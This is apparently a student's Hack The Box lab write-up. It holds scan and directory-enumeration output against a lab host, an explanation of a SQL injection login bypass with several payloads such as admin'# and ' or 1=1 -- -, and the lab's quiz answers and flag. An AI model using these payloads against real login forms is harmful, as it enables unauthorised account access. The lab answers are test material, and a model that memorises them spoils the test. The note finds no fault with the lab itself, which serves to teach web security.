```
blob:https://app.hackthebox.com/5be081bc-9048-421a-a11f-090c3e6d5944

┌──(kali㉿kali)-[~]
└─$ ping 10.129.221.123
PING 10.129.221.123 (10.129.221.123) 56(84) bytes of data.
64 bytes from 10.129.221.123: icmp_seq=1 ttl=63 time=506 ms
64 bytes from 10.129.221.123: icmp_seq=2 ttl=63 time=500 ms
^C
--- 10.129.221.123 ping statistics ---
3 packets transmitted, 2 received, 33.3333% packet loss, time 2005ms
rtt min/avg/max/mdev = 500.240/503.289/506.338/3.049 ms
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.129.221.123 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.129.221.123:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-01 12:47 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:47
Completed NSE at 12:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:47
Completed NSE at 12:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:47
Completed NSE at 12:47, 0.00s elapsed
Initiating Ping Scan at 12:47
Scanning 10.129.221.123 [2 ports]
Completed Ping Scan at 12:47, 0.45s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:47
Completed Parallel DNS resolution of 1 host. at 12:47, 0.05s elapsed
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:47
Scanning 10.129.221.123 [1 port]
Discovered open port 80/tcp on 10.129.221.123
Completed Connect Scan at 12:47, 0.29s elapsed (1 total ports)
Initiating Service scan at 12:47
Scanning 1 service on 10.129.221.123
Completed Service scan at 12:47, 6.69s elapsed (1 service on 1 host)
NSE: Script scanning 10.129.221.123.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:47
Completed NSE at 12:47, 6.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:47
Completed NSE at 12:47, 0.77s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:47
Completed NSE at 12:47, 0.00s elapsed
Nmap scan report for 10.129.221.123
Host is up, received syn-ack (0.43s latency).
Scanned at 2022-11-01 12:47:32 EDT for 15s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-favicon: Unknown favicon MD5: 7D4140C76BF7648531683BFA4F7F8C22
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:47
Completed NSE at 12:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:47
Completed NSE at 12:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:47
Completed NSE at 12:47, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.16 seconds

┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.129.221.123/ -w /usr/share/wordlists/dirb/common.txt -t 64  
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.221.123/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/01 13:28:35 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/css                  (Status: 301) [Size: 314] [--> http://10.129.221.123/css/]
/fonts                (Status: 301) [Size: 316] [--> http://10.129.221.123/fonts/]
/images               (Status: 301) [Size: 317] [--> http://10.129.221.123/images/]
/index.php            (Status: 200) [Size: 4896]
/js                   (Status: 301) [Size: 313] [--> http://10.129.221.123/js/]
/server-status        (Status: 403) [Size: 279]
/vendor               (Status: 301) [Size: 317] [--> http://10.129.221.123/vendor/]
Progress: 4614 / 4615 (99.98%)===============================================================
2022/11/01 13:28:57 Finished
===============================================================


the script will now
only search if any entry exists with the username admin . In this case, we got lucky. There is indeed an
account called admin , which will validate our SQL Injection and return the 1 value for the $count variable,
which will be put through the if statement , allowing us to log-in without knowing the password. If there
was no admin account, we could try any other accounts until we found one that existed. ( administrator ,
root , john_doe , etc.) Any valid, existing username would make our SQL Injection work.

username: admin'#   password: a

# comment

SELECT * FROM users WHERE username='admin'#' AND password='a'

admin'-- -
a

' or 1=1 -- -
a

' or 1=1#
a

' or "1"="1"-- -
a

' or "x"="x"#
a


Congratulations!

Your flag is: e3d0796d002a446c0e622226f42e9672
```

What does the acronym SQL stand for? 
*Structured Query Language*

What is one of the most common type of SQL vulnerabilities? 
*SQL injection*

What does PII stand for? 
It's a common term found in user data protection. Use camel case.
*Personally Identifiable Information*

What does the OWASP Top 10 list name the classification for this vulnerability? 
It holds the third place (first place in the previous one) in the OWASP Top 10 list of most commonly met web vulnerabilities. Use the complete classification name.
*A03:2021-Injection* https://owasp.org/www-project-top-ten/

What service and version are running on port 80 of the target? 
*Apache httpd 2.4.38 ((Debian))*

What is the standard port used for the HTTPS protocol? 
*443*

What is one luck-based method of exploiting login pages? 
Remember to add a dash of wordlists!
*brute-forcing*

 What is a folder called in web-application terminology? 
 Whenever I'm a bad employee, I get called to the director's office.
 *directory*

What response code is given for "Not Found" errors? 
*404*

What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains? 
*dir*

 What symbol do we use to comment out parts of the code? 
 *#*

![[Pasted image 20221101123641.png]]

Submit root flag 
*e3d0796d002a446c0e622226f42e9672*


[[Redeemer]]